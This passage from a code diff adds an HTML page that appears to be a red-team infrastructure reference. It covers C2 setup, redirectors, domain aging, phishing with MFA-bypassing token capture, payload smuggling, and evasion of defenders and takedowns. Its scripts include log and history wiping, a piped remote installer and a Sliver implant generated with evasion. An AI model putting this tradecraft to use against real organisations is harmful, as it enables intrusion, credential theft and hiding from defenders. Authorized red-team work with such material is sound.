@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Infrastructure Reference</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#08090c;color:#e5e7eb;font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh}
+.mono{font-family:'Cascadia Code','IBM Plex Mono','Fira Code',monospace}
+.off{color:#ef4444;font-weight:600;font-size:.82em}
+.hd{padding:10px 14px 0;border-bottom:1px solid #1a1d27;background:linear-gradient(180deg,#0c0e14,#08090c)}
+.hd h1{font-size:1em;font-weight:800;background:linear-gradient(135deg,#34d399,#60a5fa,#a78bfa);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.hd .sub{font-size:.62em;color:#374151}
+.st{display:flex;gap:1px;overflow-x:auto;flex-wrap:wrap}
+.sb{padding:4px 7px;border:none;cursor:pointer;border-radius:6px 6px 0 0;font-size:.66em;font-weight:600;white-space:nowrap;background:transparent;color:#374151;border-bottom:2px solid transparent;transition:all .15s}
+.sb.on{background:#111318}
+.sb[data-sc="kit"],.sb[data-sc="byp"]{border-left:2px solid #ffffff15;margin-left:4px}
+.ut{padding:0 14px;background:#0a0b10;border-bottom:1px solid #1a1d27;display:flex}
+.ub{padding:7px 12px;border:none;cursor:pointer;font-size:.7em;font-weight:600;background:transparent;color:#4b5563;border-bottom:2px solid transparent;display:flex;align-items:center;gap:4px}
+.ub.on{color:#e5e7eb;border-bottom-color:#e5e7eb}
+.cnt{font-size:.82em;background:#1f2937;padding:0 4px;border-radius:6px;color:#9ca3af}
+.ct{padding:10px 14px;overflow-x:auto}
+.fr{display:flex;align-items:flex-start;gap:0;overflow-x:auto;padding:8px 0}
+.ar{display:flex;align-items:center;padding:0 4px;flex-shrink:0}
+.ar .ln{width:24px;height:2px;background:linear-gradient(90deg,#4b5563,#9ca3af)}
+.ar .tp{color:#9ca3af;font-size:13px;margin-left:-2px}
+.ar .lb{font-size:.62em;color:#6b7280;margin-left:3px;white-space:nowrap}
+.bx{background:#0d0f14;border-radius:8px;flex-shrink:0;overflow:hidden}
+.bx-h{padding:6px 10px;font-weight:700;font-size:.8em}
+.bx-s{font-size:.65em;color:#4b5563;margin-top:1px}
+.bx-b{padding:6px 10px}
+.fd{display:flex;gap:6px;padding:1.5px 0;font-size:.78em;align-items:baseline}
+.fd.hl{background:#ffffff08;border-radius:3px;padding:2px 4px}
+.fd .tp{color:#6b7280;font-size:.82em}
+.tg{display:inline-block;padding:1px 7px;border-radius:4px;font-size:.78em;font-weight:700}
+.tg-s{padding:0 5px;font-size:.68em}
+.nt{margin:6px 0;padding:7px 10px;border-radius:6px}
+.nt .nl{font-size:.6em;font-weight:800;letter-spacing:.08em;margin-bottom:2px}
+.nt .nb{color:#d1d5db;font-size:.78em;line-height:1.4}
+.cp{border:1px solid #1f2937;border-radius:8px;overflow:hidden;margin-bottom:6px}
+.ct2{width:100%;padding:8px 12px;border:none;cursor:pointer;text-align:left;background:#0d0f14;display:flex;align-items:center;gap:8px}
+.ct2:hover{background:#111827}
+.cv{color:#6b7280;font-size:12px;transition:transform .15s;display:inline-block}
+.cv.op{transform:rotate(90deg)}
+.ct2 .tl{color:#e5e7eb;font-size:.8em;font-weight:600;flex:1}
+.cb{margin:0;padding:10px 14px;background:#080a0f;font-size:.74em;line-height:1.5;color:#a5f3fc;overflow-x:auto;border-top:1px solid #1f2937;white-space:pre;tab-size:4}
+.cb .cm{color:#4b5563}
+.cb .pp{color:#f59e0b}
+.ti{border-radius:6px;overflow:hidden;border:1px solid #1f2937;background:#0a0c10;margin-bottom:3px}
+.ti.op{border-color:#f9731640;background:#f9731608}
+.tt{width:100%;padding:6px 10px;border:none;cursor:pointer;text-align:left;background:transparent;display:flex;align-items:center;gap:6px}
+.tt .tn{font-size:.78em;font-weight:600;color:#9ca3af}
+.ti.op .tn{color:#fdba74}
+.td{padding:4px 10px 8px 26px;color:#d1d5db;font-size:.76em;line-height:1.5}
+.nb2{padding:2px 6px;border:1px solid #1f2937;border-radius:4px;cursor:pointer;background:#0d0f14;color:#4b5563;font-size:.65em}
+.ft{padding:8px 14px;border-top:1px solid #1a1d27;display:flex;gap:8px;flex-wrap:wrap;font-size:.6em}
+.dt{width:6px;height:6px;border-radius:2px;display:inline-block}
+.grd{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:8px}
+</style>
+</head>
+<body>
+<div id="app"></div>
+<script>
+var $=function(s){return document.querySelector(s)};
+var $$=function(s){return Array.prototype.slice.call(document.querySelectorAll(s))};
+function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
+var SE=[
+{id:"c2s",l:"A. C2 Servers",i:"\u{1F5A5}\uFE0F",c:"#f87171"},
+{id:"rdr",l:"B. Redirectors",i:"\u{1F500}",c:"#60a5fa"},
+{id:"dom",l:"C. Domains",i:"\u{1F310}",c:"#a78bfa"},
+{id:"phi",l:"D. Phishing",i:"\u{1F4E7}",c:"#fbbf24"},
+{id:"pld",l:"E. Payload Hosting",i:"\u{1F4E6}",c:"#34d399"},
+{id:"arc",l:"F. Architecture",i:"\u{1F3D7}\uFE0F",c:"#f59e0b"},
+{id:"aut",l:"G. Automation",i:"\u2699\uFE0F",c:"#e879f9"},
+{id:"kit",l:"H. Toolkit",i:"\u{1F9F0}",c:"#f472b6"},
+{id:"byp",l:"I. Bypasses",i:"\u{1F6E1}\uFE0F",c:"#fb923c"}
+];
+var S={s:'c2s',t:'flow'};
+function T(t,c,s){return '<span class="tg'+(s?' tg-s':'')+'\" style=\"background:'+c+'18;color:'+c+';border:1px solid '+c+'30\">'+t+'</span>'}
+function A(l){return '<div class="ar"><div class="ln"></div><div class="tp">&#9658;</div>'+(l?'<div class="lb">'+l+'</div>':'')+'</div>'}
+function B(t,c,b,w,s){return '<div class="bx" style="min-width:'+(w||220)+'px;max-width:'+(w?w+100:330)+'px;border:1px solid '+c+'35"><div class="bx-h" style="color:'+c+';border-bottom:1px solid '+c+'20;background:linear-gradient(135deg,'+c+'12,'+c+'05)">'+t+(s?'<div class="bx-s">'+s+'</div>':'')+'</div><div class="bx-b">'+b+'</div></div>'}
+function F(o,n,t,hl){return '<div class="fd'+(hl?' hl':'')+'\">'+(o?'<code class="mono off">'+o+'</code> ':'')+' <span style="flex:1">'+n+'</span>'+(t?'<span class="tp mono">'+t+'</span>':'')+'</div>'}
+function N(l,c,b){return '<div class="nt" style="background:'+c+'08;border:1px solid '+c+'25"><div class="nl" style="color:'+c+'">'+l+'</div><div class="nb">'+b+'</div></div>'}
+function CRD(icon,title,color,body){return '<div style="border-radius:8px;border:1px solid '+color+'25;background:'+color+'06;overflow:hidden"><div style="padding:8px 10px;color:'+color+';border-bottom:1px solid '+color+'15;font-weight:700;font-size:.76em">'+icon+' '+title+'</div><div style="padding:8px 10px;font-size:.72em;color:#d1d5db;line-height:1.5">'+body+'</div></div>'}
+function fC2S(){
+var h='<div style="font-size:.72em;font-weight:800;color:#f87171;letter-spacing:.06em;margin-bottom:6px">C2 SERVER SETUP</div>';
+h+='<div class="grd">';
+h+=CRD("\u{1F5A5}\uFE0F","Cobalt Strike Teamserver","#f87171",
+F("","Dedicated VPS (4+ GB RAM, 2+ cores)","")+F("","./teamserver IP password profile.profile","")+F("","Bind to localhost only (127.0.0.1)","")+F("","Access through SSH tunnel or redirector","")+F("","Never expose port 50050 to internet","")+F("","Multiple operators via shared sessions",""));
+h+=CRD("\u{1F98A}","Sliver C2","#f87171",
+F("","Single binary, no Java dependency","")+F("","mTLS, WireGuard, HTTP(S), DNS protocols","")+F("","sliver-server daemon mode","")+F("","Built-in multiplayer support","")+F("","Operator configs via: new-operator","")+F("","Stager + stageless implant generation",""));
+h+=CRD("\u{1F480}","Mythic C2","#f87171",
+F("","Docker-based, modular agents","")+F("","docker-compose up -d","")+F("","Web UI on port 7443","")+F("","Agents: Apollo (.NET), Poseidon (Go), etc.","")+F("","C2 profiles per agent type","")+F("","Collaborative via web UI",""));
+h+=CRD("\u{1F6E1}\uFE0F","Hardening","#f87171",
+F("","SSH key-only auth (disable password)","")+F("","UFW/iptables: allow only required ports","")+F("","fail2ban for brute-force protection","")+F("","Disable ICMP responses","")+F("","Non-standard SSH port","")+F("","Full disk encryption (LUKS)",""));
+h+=CRD("\u{1F4CA}","Logging Discipline","#f87171",
+F("","Disable bash history: unset HISTFILE","")+F("","Redirect logs to /dev/null or encrypted vol","")+F("","Minimal syslog retention","")+F("","No third-party monitoring agents","")+F("","Cron to wipe logs on schedule",""));
+h+=CRD("\u{1F504}","Multi-C2 Architecture","#f87171",
+F("","Long-haul: slow beacon, max stealth","")+F("","Short-haul: fast interactive, disposable","")+F("","Post-exploitation: different infra entirely","")+F("","Separate domains/IPs per tier","")+F("","Compromise of one tier doesn\u2019t burn others",""));
+h+='</div>';return h;
+}
+
+function fRDR(){
+var h='<div style="font-size:.72em;font-weight:800;color:#60a5fa;letter-spacing:.06em;margin-bottom:6px">REDIRECTOR ARCHITECTURE</div>';
+h+='<div class="fr">';
+h+=B("Target","#60a5fa",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","Beacon callback","")+F("","HTTPS to redirector domain","")+F("","Matching C2 profile","")+F("","Correct headers/URI","")+'</div>',180);
+h+=A("443");
+h+=B("Redirector","#60a5fa",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","Apache mod_rewrite","")+F("","Nginx proxy_pass","")+F("","socat TCP relay","")+F("","Filter: UA, URI, IP, headers","")+F("","Valid traffic \u2192 C2","")+F("","Invalid traffic \u2192 decoy site","")+'</div>',220);
+h+=A("filtered");
+h+=B("C2 Server","#60a5fa",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","Bound to localhost","")+F("","Receives only validated traffic","")+F("","IP never exposed","")+F("","SSH tunnel for operator access","")+'</div>',200);
+h+='</div>';
+h+='<div class="grd" style="margin-top:8px">';
+h+=CRD("\u{1F310}","HTTP/HTTPS Redirector","#60a5fa",
+F("","Apache: mod_rewrite + mod_proxy","")+F("","Nginx: proxy_pass + if conditions","")+F("","Match URI, User-Agent, source IP range","")+F("","Let\u2019s Encrypt cert on redirector","")+F("","Redirect invalid to legit site (302/200)",""));
+h+=CRD("\u{1F4E1}","DNS Redirector","#60a5fa",
+F("","iptables DNAT for DNS C2 traffic","")+F("","socat UDP relay: socat UDP4-RECVFROM:53,...","")+F("","NS record points to redirector IP","")+F("","Redirector forwards to C2 DNS listener","")+F("","Authoritative zone setup required",""));
+h+=CRD("\u{1F4E7}","SMTP Redirector","#60a5fa",
+F("","Postfix relay for phishing email","")+F("","Redirect clicks through HTTP redirector","")+F("","SPF includes redirector IP","")+F("","Separate from C2 redirectors","")+F("","Disposable: plan for takedown",""));
+h+='</div>';
+h+=N("RULE","#60a5fa","<b>Never</b> let target traffic touch C2 directly. Every protocol gets its own redirector chain. Redirectors are disposable \u2014 C2 servers are not.");
+return h;
+}
+
+function fDOM(){
+var h='<div style="font-size:.72em;font-weight:800;color:#a78bfa;letter-spacing:.06em;margin-bottom:6px">DOMAIN ACQUISITION & MANAGEMENT</div>';
+h+='<div class="grd">';
+h+=CRD("\u{1F6D2}","Purchasing Strategy","#a78bfa",
+F("","Expired domains with history (expireddomains.net)","")+F("","Check Wayback Machine for clean history","")+F("","Verify no spam/malware blacklisting","")+F("","Check existing categorization (bonus!)","")+F("","Privacy-focused registrars (Njalla, Epik)","")+F("","Crypto payment where possible",""));
+h+=CRD("\u23F3","Domain Aging","#a78bfa",
+F("","Register 6-12 months before operation","")+F("","Host legitimate static content","")+F("","Get indexed by search engines","")+F("","Build backlinks organically (optional)","")+F("","Submit to categorization engines","")+F("","Older domain = higher trust score",""));
+h+=CRD("\u{1F50D}","Categorization","#a78bfa",
+F("","Target categories: Business, Technology, Health","")+F("","Bluecoat/Symantec: sitereview.bluecoat.com","")+F("","McAfee: trustedsource.org","")+F("","Palo Alto: urlfiltering.paloaltonetworks.com","")+F("","Fortinet: fortiguard.com/webfilter","")+F("","Submit if uncategorized",""));
+h+=CRD("\u{1F512}","SSL/TLS Certificates","#a78bfa",
+F("","Let\u2019s Encrypt: free, automated, 90-day","")+F("","Paid EV/OV for higher trust indicators","")+F("","cert-manager for auto-renewal","")+F("","Match cert to redirector, not C2","")+F("","Don\u2019t leak C2 IP in cert transparency",""));
+h+=CRD("\u{1F4CB}","DNS Configuration","#a78bfa",
+F("","A records to redirector IPs","")+F("","MX records for phishing domain","")+F("","NS delegation for DNS C2 subdomain","")+F("","Low TTL during operation (300s)","")+F("","CloudFlare for IP masking (careful with TOS)","")+F("","Separate DNS provider from registrar",""));
+h+=CRD("\u{1F504}","Domain Rotation","#a78bfa",
+F("","Multiple domains per engagement","")+F("","Rotate on schedule or on burn detection","")+F("","Dead drop resolver: beacon asks \u201Cwhere to go?\u201D","")+F("","Fallback domains pre-configured in implant","")+F("","Domain fronting as last resort",""));
+h+='</div>';return h;
+}
+
+function fPHI(){
+var h='<div style="font-size:.72em;font-weight:800;color:#fbbf24;letter-spacing:.06em;margin-bottom:6px">PHISHING INFRASTRUCTURE</div>';
+h+='<div class="fr">';
+h+=B("Mail Server","#fbbf24",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","GoPhish, King Phisher, Evilginx","")+F("","Postfix/Sendmail for SMTP","")+F("","SPF, DKIM, DMARC configured","")+F("","Reverse DNS (PTR) matches domain","")+F("","IP not on blacklists","")+'</div>',220);
+h+=A("sends");
+h+=B("SMTP Redirector","#fbbf24",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","Relay-only Postfix","")+F("","Forwards to target MX","")+F("","SPF includes this IP","")+F("","Separate from C2 infra","")+F("","Disposable (plan for takedown)","")+'</div>',200);
+h+=A("delivers");
+h+=B("Target Inbox","#fbbf24",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","Passes spam filters","")+F("","Link to payload/credential page","")+F("","Click tracking via GoPhish","")+F("","Credential harvest or payload delivery","")+'</div>',200);
+h+='</div>';
+h+='<div class="grd" style="margin-top:8px">';
+h+=CRD("\u2705","SPF / DKIM / DMARC","#fbbf24",
+F("","SPF: v=spf1 ip4:REDIR_IP ~all","")+F("","DKIM: opendkim signing on mail server","")+F("","DMARC: v=DMARC1; p=none; (initially)","")+F("","PTR record: IP resolves to mail domain","")+F("","All 4 required for inbox delivery",""));
+h+=CRD("\u{1F3A3}","Credential Harvesting","#fbbf24",
+F("","Evilginx2: reverse proxy, captures tokens","")+F("","Modlishka: transparent reverse proxy","")+F("","GoPhish landing pages: HTML clone","")+F("","POST to capture server, redirect to real site","")+F("","Session token capture bypasses MFA",""));
+h+=CRD("\u{1F50D}","Email Deliverability Testing","#fbbf24",
+F("","mail-tester.com: score before sending","")+F("","Check MXToolbox for blacklists","")+F("","Send test emails to Gmail, O365, ProtonMail","")+F("","Warm up IP: low volume first, scale up","")+F("","Monitor bounce rate and spam reports",""));
+h+='</div>';return h;
+}
+
+function fPLD(){
+var h='<div style="font-size:.72em;font-weight:800;color:#34d399;letter-spacing:.06em;margin-bottom:6px">PAYLOAD HOSTING & DELIVERY</div>';
+h+='<div class="grd">';
+h+=CRD("\u2601\uFE0F","Cloud Storage","#34d399",
+F("","AWS S3 + CloudFront: high trust, CDN-cached","")+F("","Azure Blob + CDN: *.blob.core.windows.net","")+F("","Google Cloud Storage: storage.googleapis.com","")+F("","Signed URLs for time-limited access","")+F("","Pre-signed: auto-expire after window",""));
+h+=CRD("\u{1F310}","CDN Delivery","#34d399",
+F("","CloudFront distribution fronts S3 bucket","")+F("","Target downloads from CDN IP (trusted)","")+F("","Firewall cannot block CDN IP ranges","")+F("","Custom domain on CDN for categorization","")+F("","Object versioning for payload rotation",""));
+h+=CRD("\u{1F4E6}","Dead Drop Resolvers","#34d399",
+F("","Paste sites: Pastebin, GitHub Gists, Hastebin","")+F("","Social media: Twitter bios, Reddit posts","")+F("","DNS TXT records with encoded data","")+F("","Google Sheets / Calendar as C2 channel","")+F("","Steganography in hosted images",""));
+h+=CRD("\u{1F578}\uFE0F","Web Server Hosting","#34d399",
+F("","Nginx/Apache on redirector VPS","")+F("","Serve payload only to correct User-Agent","")+F("","Return 404 to scanners/crawlers","")+F("","Geo-restrict by IP range","")+F("","One-time download: delete after first hit",""));
+h+=CRD("\u{1F4E5}","Smuggling Containers","#34d399",
+F("","ISO: mounts as drive, bypasses MOTW","")+F("","VHD/VHDX: same MOTW bypass","")+F("","ZIP with password: AV can\u2019t scan contents","")+F("",".img files: raw disk image mount","")+F("","OneNote: embedded files (patched but legacy)",""));
+h+=CRD("\u{1F6A2}","HTML Smuggling","#34d399",
+F("","JavaScript builds payload in browser","")+F("","Blob URL + a.click() for download","")+F("","No server-side file to scan","")+F("","Payload reconstructed from Base64/XOR","")+F("","Bypasses network proxy file inspection",""));
+h+='</div>';return h;
+}
+function fARC(){
+var h='<div style="font-size:.72em;font-weight:800;color:#f59e0b;letter-spacing:.06em;margin-bottom:6px">NETWORK ARCHITECTURE</div>';
+h+='<div class="fr">';
+h+=B("Operator","#f59e0b",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","Personal machine","")+F("","VPN (commercial, crypto-paid)","")+F("","Never direct connection to infra","")+'</div>',180);
+h+=A("VPN");
+h+=B("Jump Box","#f59e0b",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","SSH bastion host","")+F("","Key-only auth","")+F("","Different provider from C2","")+F("","No logging, ephemeral","")+'</div>',200);
+h+=A("SSH");
+h+=B("C2 Server","#f59e0b",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","Bound to 127.0.0.1","")+F("","SSH tunnel for management","")+F("","No direct internet exposure","")+'</div>',200);
+h+=A("redir");
+h+=B("Redirector(s)","#f59e0b",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","Public-facing","")+F("","Filters to C2","")+F("","Disposable","")+'</div>',160);
+h+=A("\u2190");
+h+=B("Target","#f59e0b",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","Implant beacons","")+F("","Sees only redirector IP","")+F("","HTTPS to categorized domain","")+'</div>',180);
+h+='</div>';
+h+='<div class="grd" style="margin-top:8px">';
+h+=CRD("\u{1F512}","VPN Layering","#f59e0b",
+F("","Layer 1: Commercial VPN (Mullvad, crypto-paid)","")+F("","Layer 2: VPS jump box (different provider)","")+F("","Layer 3: C2 access via SSH tunnel","")+F("","Each layer different provider + jurisdiction","")+F("","Kill switch on every layer",""));
+h+=CRD("\u{1F30D}","Provider Diversification","#f59e0b",
+F("","C2: Provider A (e.g., DigitalOcean)","")+F("","Redirectors: Provider B (e.g., Vultr, Linode)","")+F("","Jump box: Provider C (e.g., AWS Lightsail)","")+F("","Phishing: Provider D (e.g., Hetzner)","")+F("","Single provider compromise \u2260 total loss",""));
+h+=CRD("\u{1F3F7}\uFE0F","Network Segmentation Rules","#f59e0b",
+F("","C2 management: SSH only from jump box","")+F("","Redirector \u2192 C2: specific port only","")+F("","No direct operator \u2192 C2 path","")+F("","Phishing infra fully separate","")+F("","Log infra isolated from operational",""));
+h+='</div>';return h;
+}
+
+function fAUT(){
+var h='<div style="font-size:.72em;font-weight:800;color:#e879f9;letter-spacing:.06em;margin-bottom:6px">INFRASTRUCTURE AUTOMATION</div>';
+h+='<div class="grd">';
+h+=CRD("\u{1F3D7}\uFE0F","Terraform","#e879f9",
+F("","Infrastructure as Code for all VPS/DNS/CDN","")+F("","terraform apply: spin up entire infra","")+F("","terraform destroy: clean teardown","")+F("","State file: encrypted, never committed","")+F("","Providers: AWS, DO, Vultr, Azure, GCP","")+F("","Modules for reusable components",""));
+h+=CRD("\u{1F4E6}","Ansible","#e879f9",
+F("","Configuration management post-deploy","")+F("","Playbooks: C2 install, redirector config, hardening","")+F("","Roles: common, c2_server, redirector, phishing","")+F("","Idempotent: run multiple times safely","")+F("","Vault for secrets encryption","")+F("","Dynamic inventory from Terraform output",""));
+h+=CRD("\u2601\uFE0F","Cloud-Init","#e879f9",
+F("","Bootstrap scripts on VPS first boot","")+F("","Install packages, configure firewall","")+F("","Pull configs from encrypted source","")+F("","No manual SSH needed for initial setup","")+F("","Supported by all major cloud providers",""));
+h+=CRD("\u{1F504}","Rapid Teardown","#e879f9",
+F("","Automated destroy scripts per component","")+F("","Destroy redirectors first (public-facing)","")+F("","Backup critical data before teardown","")+F("","Rotate to new infra seamlessly","")+F("","DNS TTL low enough for fast rotation","")+F("","Pre-staged replacement infra ready",""));
+h+=CRD("\u{1F4C4}","Packer","#e879f9",
+F("","Pre-built VM images with all tools","")+F("","Packer template: OS + packages + configs","")+F("","Deploy from image = seconds not minutes","")+F("","Separate images: c2, redirector, phishing","")+F("","Version images for rollback",""));
+h+=CRD("\u{1F433}","Docker / Containers","#e879f9",
+F("","Mythic C2: docker-compose native","")+F("","GoPhish in container for isolation","")+F("","Redirector Nginx in Docker","")+F("","Quick spin up/down, reproducible","")+F("","Portability across providers",""));
+h+='</div>';return h;
+}
+
+function fKIT(){
+var h='<div style="font-size:.72em;font-weight:800;color:#f472b6;letter-spacing:.06em;margin-bottom:6px">PROVIDER SELECTION</div>';
+h+='<div class="grd" style="margin-bottom:10px">';
+var providers=[
+{n:"DigitalOcean",d:"Simple, API-driven, Terraform support. Popular for C2. Snap/image backup.",c:"#60a5fa",p:"$5/mo",r:"C2"},
+{n:"Vultr",d:"Global regions, hourly billing, good API. Crypto payment accepted.",c:"#a78bfa",p:"$5/mo",r:"Redirectors"},
+{n:"Linode (Akamai)",d:"Solid performance, NodeBalancers. Good for redirectors behind LB.",c:"#34d399",p:"$5/mo",r:"Redirectors"},
+{n:"AWS Lightsail",d:"Amazon\u2019s VPS. Lightsail for simple, EC2 for advanced. High trust IPs.",c:"#f59e0b",p:"$5/mo",r:"All tiers"},
+{n:"Azure",d:"Enterprise-trusted IPs. Domain fronting partially blocked. VMs + CDN.",c:"#60a5fa",p:"$15/mo",r:"CDN/Hosting"},
+{n:"Hetzner",d:"EU-based, cheap, good specs. Crypto payment. Abuse-tolerant (relatively).",c:"#34d399",p:"$4/mo",r:"Phishing"},
+{n:"OVH",d:"EU hosting, anti-DDoS included. Abuse handling slower. Budget friendly.",c:"#a78bfa",p:"$3.5/mo",r:"Redirectors"},
+{n:"Mullvad VPN",d:"No account needed. Crypto payment. WireGuard. No email required.",c:"#f87171",p:"$5/mo",r:"VPN layer"}
+];
+providers.forEach(function(x){
+h+='<div style="border-radius:6px;border:1px solid '+x.c+'20;background:'+x.c+'06;padding:5px 8px"><div style="display:flex;justify-content:space-between;align-items:baseline"><span style="font-weight:700;color:'+x.c+';font-size:.76em">'+x.n+'</span><span style="font-size:.6em;color:#6b7280;background:#1f2937;padding:1px 6px;border-radius:3px">'+x.r+' \u2022 '+x.p+'</span></div><div style="font-size:.68em;color:#9ca3af;margin-top:1px">'+x.d+'</div></div>';
+});
+h+='</div>';
+h+=N("BUDGET ESTIMATE","#f472b6","Minimum viable red team infra: <b>C2 ($5) + Jump ($5) + 2x Redirector ($10) + VPN ($5) + Domain ($15) = ~$40/month</b>. Add phishing infra for +$15-20. Multiply for multi-tier (long-haul + short-haul).");
+h+='<div style="font-size:.72em;font-weight:800;color:#f472b6;letter-spacing:.06em;margin:10px 0 6px">HARDENING CHECKLIST</div>';
+var checks=[
+{t:"SSH hardening",d:"Key-only auth, non-standard port, AllowUsers directive, fail2ban"},
+{t:"Firewall rules",d:"Default deny. Allow only: redirector\u2192C2 port, operator SSH from jump box"},
+{t:"Disk encryption",d:"LUKS full disk. Auto-wipe on N failed boot attempts (advanced)"},
+{t:"Monitoring",d:"Detect if redirector is probed. Alert on unexpected SSH. Canary tokens on infra"},
+{t:"Backups",d:"Encrypted snapshots of C2 (not redirectors). Rotate backup keys per engagement"},
+{t:"Deconfliction",d:"Register infra with coordination body if required. Document all IPs/domains used"}
+];
+h+='<div class="grd">';
+checks.forEach(function(c){
+h+='<div style="border-radius:6px;border:1px solid #f472b625;background:#f472b606;padding:5px 8px"><div style="font-weight:700;color:#f472b6;font-size:.72em">'+c.t+'</div><div style="font-size:.68em;color:#9ca3af;margin-top:1px">'+c.d+'</div></div>';
+});
+h+='</div>';
+return h;
+}
+
+function fBYP(){
+var h='<div class="grd">';
+h+=CRD("\u{1F30D}","IP Reputation Management","#fb923c",
+F("","Fresh VPS IPs may be flagged (previous tenant)","")+F("","Check: abuseipdb.com, ipvoid.com, virustotal.com","")+F("","Send test traffic before deploying payload","")+F("","Cloud provider IPs generally trusted","")+F("","Residential proxies for highest trust","")+F("","Rotate IPs if reputation degrades",""));
+h+=CRD("\u{1F6E1}\uFE0F","Cloud Detection Bypass","#fb923c",
+F("","Cloud providers fingerprinted (AS number)","")+F("","Some targets block known cloud IP ranges","")+F("","CDN fronting: target sees CDN IP, not VPS","")+F("","Residential proxies: traffic from ISP IPs","")+F("","Domain age + categorization reduces suspicion",""));
+h+=CRD("\u{1F4CB}","Takedown Resistance","#fb923c",
+F("","Multi-provider: single takedown is partial","")+F("","Fallback domains pre-configured in implant","")+F("","Dead drop resolver for domain rotation","")+F("","Abuse-tolerant providers (research TOS carefully)","")+F("","Pre-staged replacement infra (warm standby)",""));
+h+=CRD("\u{1F50E}","Certificate Transparency Evasion","#fb923c",
+F("","CT logs reveal all issued certificates","")+F("","crt.sh monitors cert issuance","")+F("","Blue teams monitor CT for their domains","")+F("","Use wildcard certs (fewer CT entries)","")+F("","CloudFlare universal SSL (shared cert)",""));
+h+=CRD("\u{1F4E1}","Network Fingerprint Evasion","#fb923c",
+F("","JARM: TLS server fingerprinting tool","")+F("","Default C2 JARM is well-known (Cobalt Strike)","")+F("","Nginx/Apache in front changes JARM","")+F("","Redirector TLS terminates, proxies to C2","")+F("","Match JARM to common web servers",""));
+h+=CRD("\u{1F9F0}","Shodan / Censys Evasion","#fb923c",
+F("","Scanners index open ports globally","")+F("","Close all unnecessary ports","")+F("","C2 management on non-standard ports","")+F("","Require client cert or SSH tunnel for mgmt","")+F("","Response filtering: return 403 to scanner UAs","")+F("","iptables: block known scanner IP ranges",""));
+h+='</div>';return h;
+}
+function getCodes(s){
+var C={};
+C.c2s=[
+{t:"Cobalt Strike teamserver hardening",l:"bash",c:"#!/bin/bash\n# Teamserver hardening script\n\n# Bind teamserver to localhost only\n# Edit teamserver script:\n# host=\"127.0.0.1\" (not 0.0.0.0)\n\n# Firewall: block everything, allow specific\nufw default deny incoming\nufw default allow outgoing\nufw allow from JUMPBOX_IP to any port 22   # SSH\nufw allow from JUMPBOX_IP to any port 50050 # CS\nufw enable\n\n# SSH hardening\nsed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config\nsed -i 's/#Port 22/Port 2222/' /etc/ssh/sshd_config\nsed -i 's/#PermitRootLogin .*/PermitRootLogin no/' /etc/ssh/sshd_config\necho \"AllowUsers operator\" >> /etc/ssh/sshd_config\nsystemctl restart sshd\n\n# Install fail2ban\napt install -y fail2ban\nsystemctl enable fail2ban\n\n# Disable ICMP\necho 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all\necho 'net.ipv4.icmp_echo_ignore_all = 1' >> /etc/sysctl.conf\n\n# Kill bash history\nunset HISTFILE\nln -sf /dev/null ~/.bash_history\necho 'export HISTSIZE=0' >> ~/.bashrc"},
+{t:"SSH tunnel for C2 management",l:"bash",c:"# Operator connects to C2 via jump box tunnel\n# Step 1: SSH to jump box\nssh -i jumpkey.pem operator@JUMPBOX_IP -p 2222\n\n# Step 2: Forward C2 port through tunnel\nssh -L 50050:127.0.0.1:50050 \\\n    -L 443:127.0.0.1:443 \\\n    -i c2key.pem operator@C2_INTERNAL_IP -p 2222\n\n# Now connect CS client to localhost:50050\n# Or single-line ProxyJump:\nssh -J operator@JUMPBOX:2222 operator@C2:2222 \\\n    -L 50050:127.0.0.1:50050\n\n# For Sliver: same tunnel approach\n# sliver-client import operator-config.cfg\n# Config points to localhost, tunneled to C2\n\n# Persistent tunnel with autossh:\nautossh -M 0 -f -N \\\n    -o 'ServerAliveInterval 30' \\\n    -o 'ServerAliveCountMax 3' \\\n    -L 50050:127.0.0.1:50050 \\\n    -J operator@JUMPBOX:2222 \\\n    operator@C2:2222"},
+{t:"Sliver C2 quick setup",l:"bash",c:"# Install Sliver server\ncurl https://sliver.sh/install | sudo bash\n\n# Start as daemon\nsystemctl start sliver\n\n# Generate operator config\n./sliver-server operator --name op1 --lhost 127.0.0.1\n# Outputs: op1_HOSTNAME.cfg\n\n# Start listeners\nsliver > https --lhost 0.0.0.0 --lport 443 \\\n    --domain your-domain.com\nsliver > dns --domains c2.your-domain.com\n\n# Generate implant\nsliver > generate --http your-domain.com \\\n    --skip-symbols --os windows --arch amd64 \\\n    --name implant1\n\n# With evasion:\nsliver > generate --http your-domain.com \\\n    --evasion --skip-symbols \\\n    --os windows --arch amd64 \\\n    --limit-datetime 2025-12-31 \\\n    --limit-domainjoined"}
+];
+C.rdr=[
